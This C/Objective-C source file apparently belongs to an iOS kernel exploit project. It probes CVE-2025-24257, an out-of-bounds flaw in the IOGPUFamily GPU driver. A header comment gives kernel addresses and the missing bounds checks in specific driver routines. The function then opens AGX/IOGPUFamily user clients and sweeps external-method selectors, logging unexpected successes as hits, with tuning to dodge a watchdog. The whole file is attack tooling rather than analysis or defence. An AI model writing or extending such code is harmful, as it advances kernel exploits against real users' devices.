/* CVE-2025-24257 — IOGPUFamily OOB probe (23C55).
   Static findings (device KC, IOGPUFamily 129.3.2):
     IOGPUGroupMemory::init  0xfffffff009f61200  -> [obj+40] = (capacity>>6)-1
                                                   (no capacity>=64 check)
     cleanup vtbl slot[1]    0xfffffff009f5f084  -> bound = [obj+40] used as
                                                   loop bound over arrayC[]
     setResourceAt handler   0xfffffff009f4e0bc  -> array[index] bounds [obj+160]
   Kept deliberately tiny: one open, a handful of calls, immediate return.
   A long selector sweep hangs the guest and LiveContainer's watchdog kills it. */
#import <IOKit/IOKitLib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include "exploit.h"
#include <stdarg.h>

#define ol(fmt, ...) nk_log(fmt, ##__VA_ARGS__)

void nk_iogpu_oob_run(void) {
    /* Group creator = IOGPUFamily sel 11 zero-arg (CVE-2025-24257 shape).
       Fast lane: only the fuzz-proven openable GPU class, no full registry
       walk (that is what got the watchdog to kill the app).              */
    ol("[oob] fast lane: AGXAcceleratorG14P + IOGPUFamily only");
    static const char *names[2] = { "AGXAcceleratorG14P", "IOGPUFamily" };
    for (int nmi = 0; nmi < 2; nmi++) {
        CFMutableDictionaryRef matching = IOServiceMatching(names[nmi]);
        if (!matching) continue;
        io_iterator_t it = 0;
        if (IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &it) != KERN_SUCCESS) {
            ol("[oob] %s enum fail", names[nmi]); continue;
        }
        io_service_t svc;
        uint32_t opened = 0, hits = 0;
        while ((svc = IOIteratorNext(it))) {
            for (uint32_t t = 0; t <= 2; t++) {
                io_connect_t conn = MACH_PORT_NULL;
                kern_return_t kr = IOServiceOpen(svc, mach_task_self(), t, &conn);
                if (kr != KERN_SUCCESS || !conn) { usleep(2000); continue; }
                opened++;
                for (uint32_t sel = 0; sel <= 12; sel++) {
                    uint64_t so[8] = {0};
                    uint32_t outN = 0;
                    kr = IOConnectCallMethod(conn, sel, NULL, 0, NULL, 0, so, &outN, NULL, NULL);
                    if (kr != (kern_return_t)0xe00002c2 && kr != KERN_FAILURE
                        && kr != (kern_return_t)0xe00002c1
                        && kr != (kern_return_t)0xe00002c7) {
                        ol("[oob] HIT %s type=%u sel=%u kr=0x%x outN=%u",
                           names[nmi], t, sel, kr, outN);
                        hits++;
                    }
                    usleep(2000);
                }
                IOServiceClose(conn);
                usleep(2000);
            }
            IOObjectRelease(svc);
        }
        IOObjectRelease(it);
        ol("[oob] %s opened=%u hits=%u", names[nmi], opened, hits);
    }
    ol("[oob] done");
}
